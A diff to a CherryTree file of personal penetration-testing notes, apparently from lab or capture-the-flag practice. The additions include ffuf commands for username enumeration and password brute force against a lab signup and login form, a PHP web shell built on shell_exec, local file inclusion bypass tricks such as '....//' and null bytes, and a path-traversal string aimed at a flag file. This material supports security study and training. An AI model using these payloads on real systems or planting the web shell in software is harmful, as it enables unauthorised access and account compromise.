@@ -2390,7 +2390,7 @@ hashdump: Dumps the contents of the SAM database</rich_text>
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Brute-Force" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357800" ts_lastsave="1700059155">
+    <node name="Brute-Force" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357800" ts_lastsave="1700217437">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Hydra:
 </rich_text>
@@ -2461,7 +2461,41 @@ adjust http-post-form!
       <rich_text indent="3">."</rich_text>
       <rich_text>
 
+Fuff:
 </rich_text>
+      <rich_text indent="1">First check the POST request for the correct formatting</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">USERNAME:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x" -H "</rich_text>
+      <rich_text indent="2" weight="heavy">HEADERS</rich_text>
+      <rich_text indent="2">" -u </rich_text>
+      <rich_text indent="2" weight="heavy">URL</rich_text>
+      <rich_text indent="2"> -mr "</rich_text>
+      <rich_text indent="2" weight="heavy">LOOKUP_MSG</rich_text>
+      <rich_text indent="2">"</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">example:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="3">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.191.151/customers/signup -mr "username already exists"</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Login:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">ffuf -w </rich_text>
+      <rich_text indent="2" weight="heavy">USERNAMES_FILE</rich_text>
+      <rich_text indent="2">:W1,</rich_text>
+      <rich_text indent="2" weight="heavy">PASSWORDS_FILE</rich_text>
+      <rich_text indent="2">:W2 -X POST -d "username=W1&amp;password=W2" -H "</rich_text>
+      <rich_text indent="2" weight="heavy">HEADERS</rich_text>
+      <rich_text indent="2">" -u </rich_text>
+      <rich_text indent="2" weight="heavy">URL</rich_text>
+      <rich_text indent="2"> -fc 200</rich_text>
     </node>
     <node name="Cracking" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357803" ts_lastsave="1699881793">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -3068,7 +3102,7 @@ UNION ALL SELECT </rich_text>
 
 </rich_text>
     </node>
-    <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1699546525">
+    <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1700228450">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Useful online tools:
 </rich_text>
@@ -3100,6 +3134,17 @@ Web-shell (PHP):
       <rich_text indent="2">;</rich_text>
       <rich_text indent="2" weight="heavy">COMMAND2</rich_text>
       <rich_text indent="2">;</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">PHP Bash command execution:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">&lt;?php
+$output = shell_exec('</rich_text>
+      <rich_text indent="2" weight="heavy">COMMAND</rich_text>
+      <rich_text indent="2">');
+echo "&lt;pre&gt;$output&lt;/pre&gt;";
+?&gt;</rich_text>
       <rich_text>
 
 PHP reverse-shell:
@@ -3680,9 +3725,34 @@ Kernel exploits:
 </rich_text>
     <rich_text indent="2">perl linux-exploit-suggester-2.pl</rich_text>
   </node>
-  <node name="Web Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="35" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1699869509">
+  <node name="Web Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="35" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1700230376">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
+Local File Inclusion:
+</rich_text>
+    <rich_text indent="1">use</rich_text>
+    <rich_text indent="1" weight="heavy"> ../</rich_text>
+    <rich_text indent="1"> to traverse directories
+bypass input validation</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">nullbyte </rich_text>
+    <rich_text indent="2" weight="heavy">%00</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2" weight="heavy">/.</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2" weight="heavy">....//</rich_text>
+    <rich_text indent="2"> instead of ../</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Include the directory name first</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Use POST instead of GET</rich_text>
+    <rich_text>
+
 UPLOAD EXPLOITATION:
 </rich_text>
     <rich_text indent="1">RECON</rich_text>
@@ -3891,9 +3961,16 @@ GPG:
 </rich_text>
     <rich_text indent="1">New file will be created with the plaintext</rich_text>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1700064160">
-    <rich_text>
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1700230058">
+    <rich_text>10.10.110.16
 =================
+http://10.10.18.198/
+
+includes/../../../etc/flag3/.
+
+
+
+
 </rich_text>
   </node>
 </cherrytree>
